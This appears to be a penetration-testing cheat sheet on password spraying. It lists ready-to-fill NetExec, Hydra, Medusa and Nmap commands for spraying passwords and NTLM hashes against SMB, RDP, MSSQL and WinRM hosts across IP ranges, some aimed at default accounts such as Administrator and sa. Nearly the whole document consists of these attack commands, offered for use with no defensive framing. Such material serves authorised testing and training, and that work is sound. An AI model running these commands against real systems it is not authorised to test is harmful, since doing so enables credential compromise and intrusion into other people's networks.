# Unix Shell

Search Tag(s): #password-spraying

TODO: Add more knowledge to Linux for password reuse

## 01 - SMB

### 1.1 - NetExec

Password spraying.

```
$ netexec smb <IP>/<CIDR> -u users.lst -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]
```

Password/NTLM hash spraying without bruteforce.

```
$ netexec smb <IP>/<CIDR> -u users.lst -p passwords.lst [-d <domain> | --local-auth] --no-bruteforce [--continue-on-success]

$ netexec smb <IP>/<CIDR> -u users.lst -H hashes.lst [-d <domain> | --local-auth] --no-bruteforce [--continue-on-success]
```

### 1.2 - Hydra

```
$ hydra -L users.lst -p "<password>" -M ip_targets.txt smb
```

### 1.3 - Medusa

```
$ medusa -H ip_targets.txt -U users.lst -p "<password>" -M smb

$ medusa -H ip_targets.txt -U users.lst -p "<password>" -M smbnt
```

### 1.4 - Nmap

```
$ nmap -p 445 -Pn -n --script smb-brute --script-args "userdb=users.lst,passdb=passwords.lst" [--script-args smbtype=<version>] <IP>/<CIDR>

$ nmap -p 445 -Pn -n --script smb-brute --script-args "smbusername='Administrator',passdb=passwords.lst" [--script-args smbtype=<version>] <IP>/<CIDR>
```

## 02 - RDP

### 2.1 - NetExec

Password spraying

```
$ netexec rdp <IP>/<CIDR> -u users.lst -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]
```

Password/NTLM hash spraying without bruteforce.

```
$ netexec rdp <IP>/<CIDR> -u users.lst -p passwords.lst [-d <domain> | --local-auth] --no-bruteforce [--continue-on-success]

$ netexec rdp <IP>/<CIDR> -u users.lst -H hashes.lst [-d <domain> | --local-auth] --no-bruteforce [--continue-on-success]
```

### 2.2 - Hydra

```
$ hydra -l Administrator -p "<password>" -M ip_targets.txt rdp

$ hydra -L users.lst -p "<password>" -M ip_targets.txt rdp
```

### 2.3 - Medusa

```
$ medusa -H ip_targets.txt -u Administrator -p "<password>" -M rdp

$ medusa -H ip_targets.txt -U users.lst -p "<password>" -M rdp
```

## 03 - MSSQL

### 3.1 - NetExec

```
$ netexec mssql <IP>/<CIDR> -u sa -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]

$ netexec mssql <IP>/<CIDR> -u users.lst -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]
```

### 3.2 - Hydra

```
$ hydra -l sa -p "<password>" -M ip_targets.lst mssql

$ hydra -L users.lst -p "<password>" -M ip_targets.lst mssql
```

### 3.3 - Medusa

```
$ medusa -H ip_targets.txt -u sa -p "<password>" -M mssql

$ medusa -H ip_targets.txt -U users.lst -p "<password>" -M mssql
```

## 04 - WinRM

### 4.1 - NetExec

```
$ netexec winrm <IP>/<CIDR> -u Administrator -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]

$ netexec winrm <IP>/<CIDR> -u users.lst -p "<password>" [-d <domain> | --local-auth] [--continue-on-success]
```

---
## References

- [Hacking Articles: Comprehensive Guide on Password Spraying Attack](https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/)